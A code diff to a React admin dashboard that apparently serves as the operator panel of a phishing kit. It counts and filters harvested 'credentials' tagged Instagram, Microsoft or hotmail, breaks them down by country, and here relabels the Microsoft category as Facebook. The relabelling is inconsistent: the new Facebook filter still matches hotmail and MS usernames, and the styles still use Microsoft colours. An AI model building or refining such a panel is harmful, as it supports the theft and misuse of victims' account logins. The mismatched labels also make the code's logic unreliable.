@@ -17,7 +17,7 @@ export default function AdminDashboard() {
   const [stats, setStats] = useState({
     totalEntries: 0,
     instagramEntries: 0,
-    microsoftEntries: 0,
+    facebookEntries: 0,
     countries: {},
     continents: {}
   });
@@ -122,7 +122,7 @@ export default function AdminDashboard() {
     const stats = {
       totalEntries: data.length,
       instagramEntries: data.filter(item => item.username.includes('(IG)')).length,
-      microsoftEntries: data.filter(item => item.username.includes('(hotmail)') || item.username.includes('(MS)')).length,
+      facebookEntries: data.filter(item => item.username.includes('(hotmail)') || item.username.includes('(MS)')).length,
       countries: {},
       continents: {}
     };
@@ -160,7 +160,7 @@ export default function AdminDashboard() {
       filtered = filtered.filter(cred => 
         cred.username && cred.username.includes('(IG)')
       );
-    } else if (filter === 'microsoft') {
+    } else if (filter === 'facebook') {
       filtered = filtered.filter(cred => 
         cred.username && (cred.username.includes('(MS)') || 
         cred.username.includes('(hotmail)') || 
@@ -300,10 +300,18 @@ export default function AdminDashboard() {
                   </div>
                   
                   <div className="stat-card">
-                    <div className="stat-icon microsoft"><i className="fab fa-microsoft"></i></div>
+                    <div className="platform-icon">
+                      <img 
+                        src="/assets/facebook.svg" 
+                        alt="Facebook" 
+                        width="24" 
+                        height="24" 
+                        className="platform-logo" 
+                      />
+                    </div>
                     <div className="stat-content">
-                      <h3>Microsoft</h3>
-                      <p className="stat-number">{stats.microsoftEntries}</p>
+                      <h3>Facebook</h3>
+                      <p className="stat-number">{stats.facebookEntries}</p>
                     </div>
                   </div>
                   
@@ -334,10 +342,10 @@ export default function AdminDashboard() {
                         Instagram <span className="badge">{stats.instagramEntries}</span>
                       </button>
                       <button 
-                        className={filter === 'microsoft' ? 'tab-active' : ''}
-                        onClick={() => setFilter('microsoft')}
+                        className={filter === 'facebook' ? 'tab-active' : ''}
+                        onClick={() => setFilter('facebook')}
                       >
-                        Microsoft <span className="badge">{stats.microsoftEntries}</span>
+                        Facebook <span className="badge">{stats.facebookEntries}</span>
                       </button>
                     </div>
                     
@@ -372,12 +380,12 @@ export default function AdminDashboard() {
                       <tbody>
                         {filterCredentials().length > 0 ? (
                           filterCredentials().map((cred) => (
-                            <tr key={cred.id} className={cred.username.includes('(IG)') ? 'instagram-row' : 'microsoft-row'}>
+                            <tr key={cred.id} className={cred.username.includes('(IG)') ? 'instagram-row' : 'facebook-row'}>
                               <td>
                                 {cred.username.includes('(IG)') ? (
                                   <><i className="fab fa-instagram"></i> </>
                                 ) : (
-                                  <><i className="fab fa-microsoft"></i> </>
+                                  <><i className="fab fa-facebook"></i> </>
                                 )}
                                 {cred.username}
                               </td>
@@ -721,12 +729,12 @@ export default function AdminDashboard() {
           background-color: #5a2a3a;
         }
         
-        .stat-icon.microsoft {
+        .stat-icon.facebook {
           background-color: #e6f7ff;
           color: var(--microsoft);
         }
         
-        .dark-mode .stat-icon.microsoft {
+        .dark-mode .stat-icon.facebook {
           background-color: #1a3a4a;
         }
         
@@ -874,7 +882,7 @@ export default function AdminDashboard() {
           border-left: 3px solid var(--instagram);
         }
         
-        .microsoft-row td:first-child {
+        .facebook-row td:first-child {
           border-left: 3px solid var(--microsoft);
         }
         
